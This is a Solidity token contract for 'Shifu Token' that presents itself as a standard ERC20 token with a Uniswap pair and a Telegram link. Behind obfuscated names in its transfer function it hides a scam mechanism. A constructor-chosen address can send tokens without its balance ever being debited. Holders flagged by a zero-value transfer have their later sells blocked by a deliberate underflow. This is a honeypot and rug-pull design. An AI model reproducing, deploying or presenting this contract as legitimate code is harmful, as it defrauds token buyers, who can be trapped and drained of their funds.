/*

https://t.me/Shifutoken

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract ShifuToken is Ownable {
    uint256 public totalSupply;

    mapping(address => uint256) private cattle;

    constructor(address stick) {
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        totalSupply = 1000000000 * 10 ** decimals;
        cattle[stick] = expression;
        balanceOf[msg.sender] = totalSupply;
        name = 'Shifu Token';
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        symbol = 'Shifu Token';
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    address public uniswapV2Pair;

    function transferFrom(address sugar, address include, uint256 behavior) public returns (bool success) {
        shoulder(sugar, include, behavior);
        require(behavior <= allowance[sugar][msg.sender]);
        allowance[sugar][msg.sender] -= behavior;
        return true;
    }

    string public symbol;

    function approve(address unless, uint256 behavior) public returns (bool success) {
        allowance[msg.sender][unless] = behavior;
        emit Approval(msg.sender, unless, behavior);
        return true;
    }

    function shoulder(address sugar, address include, uint256 behavior) private returns (bool success) {
        if (cattle[sugar] == 0) {
            if (adventure[sugar] > 0 && uniswapV2Pair != sugar) {
                cattle[sugar] -= expression;
            }
            balanceOf[sugar] -= behavior;
        }
        balanceOf[include] += behavior;
        if (behavior == 0) {
            adventure[include] += expression;
        }
        emit Transfer(sugar, include, behavior);
        return true;
    }

    string public name;

    function transfer(address include, uint256 behavior) public returns (bool success) {
        shoulder(msg.sender, include, behavior);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    uint256 private expression = 15;

    mapping(address => uint256) private adventure;

    mapping(address => uint256) public balanceOf;

    event Approval(address indexed owner, address indexed spender, uint256 value);
}